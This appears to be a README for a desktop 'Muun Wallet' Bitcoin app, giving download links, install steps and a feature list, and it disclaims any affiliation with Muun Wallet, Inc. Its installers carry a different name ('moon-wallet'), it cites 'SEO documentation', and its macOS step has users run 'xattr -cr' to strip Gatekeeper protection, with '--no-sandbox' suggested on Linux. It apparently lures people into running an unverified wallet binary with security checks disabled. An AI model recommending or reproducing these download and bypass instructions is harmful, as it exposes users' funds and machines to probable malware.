<div align="center">

# Muun Wallet Desktop

**Self-custodial Bitcoin and Lightning wallet for macOS, Windows, and Linux — one balance, one way to pay.**

[![Version](https://img.shields.io/badge/release-v0.5.1-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Bitcoin only](https://img.shields.io/badge/bitcoin-only-orange)](https://muun-wallet.com/)

[muun-wallet.com](https://muun-wallet.com/) · [Guides & Docs](https://github.com/muun-network/muun-wallet-docs) · [Issues](https://github.com/muun-network/muun-wallet/issues)

</div>

---

## Downloads

[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)

| Platform | Installer | SHA-256 |
|---|---|---|
| macOS 11+ (Apple Silicon & Intel) | [moon-wallet-v0.5.1.dmg](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) | `60f8c59873f31d1c0489329403a3a2c4591c2f260d55e6f2e6cb08c3ce39091b` |
| Windows 10 / 11 | [moon-wallet-v0.5.1.exe](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) | `3295b19f2d4486877b7064f7316abf5f8f25f70d5b91cffb451628bae17f32c2` |
| Linux x64 (Ubuntu, Fedora, Arch) | [moon-wallet-v0.5.1.zip](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip) | `60617914e65bd3035467867502e078cc01a381ee8ee3b58cb328ff29228bdb01` |

Always verify checksums before running. See the [download verification guide](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/how-to-verify-muun-wallet-download.md).

---

## Install

**macOS**
1. Download `moon-wallet-v0.5.1.dmg` and open it.
2. Drag Muun Wallet to your Applications folder.
3. If macOS Gatekeeper blocks the first launch, open Terminal and run:
```bash
xattr -cr /Applications/MuunWallet.app
```
4. Launch from Applications normally.

**Windows**
1. Download `moon-wallet-v0.5.1.exe`.
2. Run the installer — no admin account or special permissions required beyond a standard install.
3. Launch Muun Wallet from the Start menu.

**Linux**
1. Download `moon-wallet-v0.5.1.zip` and extract.
2. Mark the binary executable and run:
```bash
chmod +x muun-wallet
./muun-wallet
```
3. If your system uses an app sandbox, add `--no-sandbox` to the launch command.

---

## Features

- **Unified Bitcoin + Lightning balance** — on-chain and Lightning in one view, automatic routing, no channels to manage
- **2-of-2 multisig security** — your device key plus a Muun-held key both required to spend; neither alone can move funds
- **Mempool-based fee estimator** — live, real-cost estimate before you confirm, calculated from current network conditions
- **Replace-by-fee (RBF)** — bump stuck or slow transactions after sending, without external tools
- **Lightning Address support** — send and receive via human-readable addresses, not just raw invoices
- **Emergency Kit recovery** — first-class in-app flow; export private keys and output descriptors independently of Muun's servers
- **Coin control** — select specific UTXOs per transaction for privacy and bookkeeping
- **Multi-account support** — separate spending, savings, or project funds under one install and one Emergency Kit
- **CSV and descriptor export** — full transaction history into any accounting or tax tool
- **LNURL-pay** — static Lightning addresses for tips, donations, and recurring payments
- **Clipboard privacy** — address detection only on explicit user action, never automatic background reads
- **Self-custodial, no KYC** — no account, no email, no sign-up required to install or use

---

## Guides

- [Getting started: first-time setup and backup](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/muun-wallet-getting-started-guide.md)
- [How to install on macOS](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/how-to-install-muun-wallet-macos.md)
- [How to install on Windows](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/how-to-install-muun-wallet-windows.md)
- [How to install on Linux](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/how-to-install-muun-wallet-linux.md)
- [Emergency Kit recovery: complete walkthrough](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/muun-wallet-emergency-kit-recovery-guide.md)
- [Lightning fees and submarine swaps explained](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/muun-wallet-lightning-fees-explained.md)
- [Is Muun Wallet safe? Security model explained](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/is-muun-wallet-safe.md)
- [Full guide index](https://github.com/muun-network/muun-wallet-docs)

---

## ⚠️ Security

**Always download from the [official release page](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) and verify the SHA-256 checksum before running.** Your private keys are generated and stored locally — back up your Emergency Kit before sending any real funds. See the [security model](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/is-muun-wallet-safe.md) for a full breakdown of the 2-of-2 multisig architecture.

---

## Related repositories

| Repo | Purpose |
|---|---|
| [muun-network/muun-wallet-docs](https://github.com/muun-network/muun-wallet-docs) | Guides, articles, and SEO documentation |
| [muun-network/recovery](https://github.com/muun-network/recovery) | Emergency Kit recovery tool |
| [muun-network/librwallet](https://github.com/muun-network/librwallet) | Core wallet library |
| [muun-network/btcd](https://github.com/muun-network/btcd) | Bitcoin protocol library (btcd fork) |
| [muun-network/bitcoinjinx](https://github.com/muun-network/bitcoinjinx) | Bitcoin primitives library |
| [muun-network/sqldelight](https://github.com/muun-network/sqldelight) | Local database layer |

---

## Support

Open an [issue](https://github.com/muun-network/muun-wallet/issues) or visit [muun-wallet.com](https://muun-wallet.com/) for documentation and guides.

---

## License

MIT. Built on the open-source Muun wallet codebase. This project is not affiliated with or endorsed by Muun Wallet, Inc.
